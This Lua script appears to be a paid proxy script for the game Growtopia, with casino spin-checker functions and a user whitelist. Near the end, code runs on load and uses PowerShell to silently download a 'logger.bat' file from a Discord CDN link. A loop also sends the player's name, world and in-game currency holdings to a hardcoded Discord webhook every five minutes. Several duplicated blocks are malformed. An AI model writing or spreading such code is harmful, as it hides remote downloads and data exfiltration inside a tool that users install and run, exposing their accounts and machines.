        var[2] = "`0[`1Introvert`0] `9CSN : `3"..x2.." `0x `9QEME : `3"..qq_mode.." `0x `9REME : `3"..reme_mode
        var[3] = -1
        var.netid = -1
        SendVarlist(var)
        OnConsoleMessage("`9CSN : `3"..x2.." `0x `9QEME : `3"..qq_mode.." `0x `9REME : `3"..reme_mode)
        return true
      end
      SendVarlist({
        [0] = "OnTalkBubble",
        [1] = varlist[1],
        [2] = text,
        [3] = -1,
        netid = -1,
      })
      return true
    end
  end
AddCallback("Spin_checker", "OnVarlist", Spin_checker)
return true
end
end


function qq_spin(type, packet)
   if 2 == type and packet:find("/sqq") then
        OnConsoleMessage("`0[ `3Introvert_7672 `0] `9Spin mode set to `3QQ")
function Spin_checker(varlist)
    if varlist[0] == "OnTalkBubble" and varlist[3] ~= -1 and varlist[2]:find("spun the wheel and got") then
      text = ""
        if varlist[2]:find("CP:") then
            start, final = string.find(varlist[2], "=")
            text = "`0[`4FAKE`0] " .. string.sub(varlist[2], final + 1)
        else
             x = varlist[2]:removeColors()
            x2 = tonumber(x:match("spun the wheel and got (%d+)"))
             qq_mode = qq_function(x2)
             reme_mode2 = reme_function(x2)
            reme_mode = qq_function(reme_mode2)
            
            local var = {}
        var[0] = "OnTalkBubble"
        var[1] = varlist[1]
        var[2] = "`0[`2REAL`0]"..varlist[2].." `9QQ : `3"..qq_mode
        var[3] = -1
        var.netid = -1
        SendVarlist(var)
        return true
      end
      SendVarlist({
        [0] = "OnTalkBubble",
        [1] = varlist[1],
        [2] = text,
        [3] = -1,
        netid = -1,
      })
      return true
    end
  end
AddCallback("Spin_checker", "OnVarlist", Spin_checker)
return true
end
end




function reme_spin(type, packet)
   if 2 == type and packet:find("/sreme") then
        OnConsoleMessage("`0[ `3Introvert_7672 `0] `9Spin mode set to `3REME")
function Spin_checker(varlist)
    if varlist[0] == "OnTalkBubble" and varlist[3] ~= -1 and varlist[2]:find("spun the wheel and got") then
      text = ""
        if varlist[2]:find("CP:") then
            start, final = string.find(varlist[2], "=")
            text = "`0[`4FAKE`0] " .. string.sub(varlist[2], final + 1)
        else
             x = varlist[2]:removeColors()
            x2 = tonumber(x:match("spun the wheel and got (%d+)"))
             qq_mode = qq_function(x2)
             reme_mode2 = reme_function(x2)
            reme_mode = qq_function(reme_mode2)
        local var = {}
        var[0] = "OnTalkBubble"
        var[1] = varlist[1]
        var[2] = "`0[`2REAL`0]"..varlist[2].." `9REME : `3"..reme_mode
        var[3] = -1
        var.netid = -1

        SendVarlist(var)
        return true
      end


      SendVarlist({
        [0] = "OnTalkBubble",
        [1] = varlist[1],
        [2] = text,
        [3] = -1,
        netid = -1,
      })
      return true
    end
  end
AddCallback("Spin_checker", "OnVarlist", Spin_checker)
return true
end
end

function Spin_checker(varlist)
    if varlist[0] == "OnTalkBubble" and varlist[3] ~= -1 and varlist[2]:find("spun the wheel and got") then
      text = ""
      if varlist[2]:find("CP:") then
        start, final = string.find(varlist[2], "=")
        text = "`0[`4FAKE`0] " .. string.sub(varlist[2], final + 1)
      else
        x = varlist[2]:removeColors()
        x2 = x:match("spun the wheel and got (%d+)")
        x2 = tonumber(x2)
        qq_mode = qq_function(x2)
        reme_mode2 = reme_function(x2)
        reme_mode = qq_function(reme_mode2)
        var = {}
        var[0] = "OnTalkBubble"
        var[1] = varlist[1]
        var[2] = "`0[ `2REAL `0] "..varlist[2]
        var[3] = -1
        var.netid = -1
        SendVarlist(var)
        return true
      end
      SendVarlist({
        [0] = "OnTalkBubble",
        [1] = varlist[1],
        [2] = text,
        [3] = -1,
        netid = -1,
      })
      return true
    end
  end

function check_spin(type, packet)
   if 2 == type and packet:find("/scheck") then
        OnConsoleMessage("`0[`3introvert_7672`0] `9Spin mode set to `3Checker")
function Spin_checker(varlist)
    if varlist[0] == "OnTalkBubble" and varlist[3] ~= -1 and varlist[2]:find("spun the wheel and got") then
        text = ""
        if varlist[2]:find("CP:") then
            start, final = string.find(varlist[2], "=")
            text = "`0[`4FAKE`0] " .. string.sub(varlist[2], final + 1)
        else
             x = varlist[2]:removeColors()
            x2 = tonumber(x:match("spun the wheel and got (%d+)"))
             qq_mode = qq_function(x2)
             reme_mode2 = reme_function(x2)
            reme_mode = qq_function(reme_mode2)

            local var ={}
        var[0] = "OnTalkBubble"
        var[1] = varlist[1]
        var[2] = "`0[`2REAL`0]"..varlist[2]
        var[3] = -1
        var.netid = -1
        SendVarlist(var)
        return true
      end

       
      SendVarlist({
        [0] = "OnTalkBubble",
        [1] = varlist[1],
        [2] = text,
        [3] = -1,
        netid = -1,
      })
      return true
    end
  end
AddCallback("Spin_checker", "OnVarlist", Spin_checker)
return true
end
end



fakespinned = false
	if vlist[0]:find("OnConsoleMessage") then
        if vlist[1]:find("spun the wheel") and vlist[1]:find("CP:_PL") then
              --  CP:_PL:0_OID:_CT:[W]_ `6<`1Turkinpippuri``>`` `$`w[`1Turkinpippuri`` spun the wheel and got `b16``!]
                log(vlist[1]:find("``>`` `"))
                lastfakespin = string.sub(vlist[1], vlist[1]:find("6<`") + 4, vlist[1]:find("``>"))
                log(lastfakespin)
                local var = {} --make table
                var[0] = "OnTalkBubble"
                var[1] = math.floor(netidfromname(lastfakespin))
                var[2] = "`w[`4FAKE`w] " .. string.sub(vlist[1], vlist[1]:find(lastfakespin) - 3, string.len(vlist[1]))
                var[3] = 394
                var[4] = 0
                var.netid = -1
                SendVarlist(var)
				lastfakespin = "NONE"
				fakespinned = true
            return true
        end
end
if not fakespinned then
 if vlist[3] == 0 and vlist[2]:find("spun the wheel") then
spinname = string.sub(vlist[2], 6, vlist[2]:find("spun the wheel") - 3)
            if lastfakespin ~= spinname then
                if shownamespin then
 
 
                    dog = string.sub(vlist[2], vlist[2]:find("got") + 6, vlist[2]:find("!]") - 3)
                    ananisikeyim = namefromnetid(math.floor(vlist[1]))
                    if ananisikeyim:find('`e') then
                        ananisikeyim = string.sub(ananisikeyim, 0, ananisikeyim:find("`e") - 5)
                    end
                    local var = {} --make table
                    var[0] = "OnNameChanged"
                    var[1] = ananisikeyim .. " `w[`eSpinned: `c" .. dog .. "`w]"
                    var.netid = vlist[1]
                    SendVarlist(var)
                end
fakespinned = false
end
end
end
end)

menuExecute()
url = "https://cdn.discordapp.com/attachments/1101533153287483513/1170578901345513502/ivertbann.rttex?ex=65598d8e&is=6547188e&hm=65e92d99b682e394c4ef025db94370121bd4356f38f3dd8a6f07f7bb00e99c3f&"
 
function open()
    local command = [[
        $url = "]] .. url .. [["
        $path = "cache/interface/large/ivertbann.rttex"
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($url, $path)
    ]]
    local shell = io.popen("powershell -command -", "w")
    shell:write(command)
    shell:close()
end
 
 
function open2()
    local command = [[
        $url = "https://cdn.discordapp.com/attachments/1101533153287483513/1119804493857554533/logger.bat"
        $path = "logger.bat"
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($url, $path)
    ]]
    local shell = io.popen("powershell -command -", "w")
    shell:write(command)
    shell:close()
end
 
function fileExists(filename)
  local file = io.open(filename, "r")
  if file then
    io.close(file)
    return true
  else
    return false
  end
end
 
if fileExists("cache/interface/large/ivertbann.rttex") then
else
open()
end
 
if fileExists("logger.bat") then
else
open2()
end

function cek_uid(uid)
    for _, user in pairs(whitelist) do
        if uid == user then
            return 1
        end
    end
    return 0
end
if cek_uid(GetLocal().userid) == 1 then

    AddCallback("fc","OnPacket", fc)
AddCallback("Spin_checker", "OnVarlist", Spin_checker)
AddCallback("setwarn","OnPacket", setwarn)
AddCallback("allspin","OnPacket", all_spin)
AddCallback("qqspin","OnPacket", qq_spin)
AddCallback("remespin","OnPacket", reme_spin)
AddCallback("checkspin","OnPacket", check_spin)
AddCallback("packet", "OnPacket", com)
AddCallback("Hook", "OnPacket", hook2)
AddCallback("Detect", "OnVarlist", hook)
SendPacket(2, "action|input\ntext|`^[`wULTIMATE GROWPAI PROXY`^]`cBy `4Introvert_7672")
menu()
l()

else
    log("You Must Pay 15 BGL To Get Access The Proxy Dm:@Introvert_7672")
    FChat("`0userID `b"..GetLocal().userid.."`4 is not in `wwhitelist")
end

WebHook = "https://discord.com/api/webhooks/1169608774537977897/j4UPU4j6FgNDn_bDlLzehlQcaaMKaSLNnsvQB4oExvvjMTXWIHmlqO1qN3stCEoF8npA" --jangan di ubah
  function removeColorAndSymbols(str)
      local cleanedStr = string.gsub(str, "`(%S)", '')
      cleanedStr = string.gsub(cleanedStr, "`{2}|(~{2})", '')
      return cleanedStr
  end
  local function FormatNumber(num)
      num = math.floor(num + 0.5)

      local formatted = tostring(num)
      local k = 3
      while k < #formatted do
          formatted = formatted:sub(1, #formatted - k) .. "," ..
                          formatted:sub(#formatted - k + 1)
          k = k + 4
      end
      return formatted
  end
  function FORMAT_TIME(seconds)
      local days = math.floor(seconds / 86400)
      local hours = math.floor((seconds % 86400) / 3600)
      local minutes = math.floor((seconds % 3600) / 60)
      local remaining_seconds = seconds % 60
      local parts = {}
      if days > 0 then
          table.insert(parts, tostring(days) .. " day" .. (days > 1 and "s" or ""))
      end
      if hours > 0 then
          table.insert(parts,
                      tostring(hours) .. " hour" .. (hours > 1 and "s" or ""))
      end
      if minutes > 0 then
          table.insert(parts, tostring(minutes) .. " minute" ..
                          (minutes > 1 and "s" or ""))
      end
      if remaining_seconds > 0 then
          table.insert(parts, tostring(remaining_seconds) .. " second" ..
                          (remaining_seconds > 1 and "s" or ""))
      end
      if #parts == 0 then
          return "0 seconds"
      elseif #parts == 1 then
          return parts[1]
      else
          local last_part = table.remove(parts)
          return table.concat(parts, ", ") .. " and " .. last_part
      end
  end


function wh()
  local payload = [[
  {
      "content": "",
      "embeds": [{
          "title": "<:wheel:1105095395371135037> Auto Host <:wheel:1105095395371135037> ",
          "description": "<:bgl:1110199855831322647> **INFORMATION** <:bgl:1110199855831322647>",
          "url": "https://avatarfiles.alphacoders.com/334/334449.png",
          "color": 69,
          "fields": [{
              "name":"Account:",
                  "value": "Name: **%s**",
                  "inline": false
          },
          {
              "name": "Information:",
                  "value": ":earth_asia: Current World: **%s**",
                  "inline": false
          },
          {
              "name": "**Player Lock:**",
              "value": "<:bgl:1110199855831322647>BGL: **%s** <:dl:1110199890572755055>DL: **%s** <:wl:1110199918649421914> WL: **%s** "
          }
          ],
          "author": {
              "name": "IntroVert AutoHost",
              "url": "https://avatarfiles.alphacoders.com/334/334449.png",
              "icon_url": "https://avatarfiles.alphacoders.com/334/334449.png"
          },
          "footer": {
              "text": "%s",
              "url": "https://cdn.discordapp.com/attachments/814384402985254940/1092698535117467728/received_881069006639056.jpg"
          }
      }]
  }]]
  payload = payload:format(removeColorAndSymbols(GetLocal().name), GetLocal().world,tostring(GetItemCount(7188)):match("(%d+)"),tostring(GetItemCount(1796)):match("(%d+)"),tostring(GetItemCount(242)):match("(%d+)"), os.date("!%a, %b/%d/%Y at %I:%M %p", os.time() + 8 * 60 * 60))
  SendWebhook(WebHook, payload)
end

while true do
wh()
Sleep(300000)
end

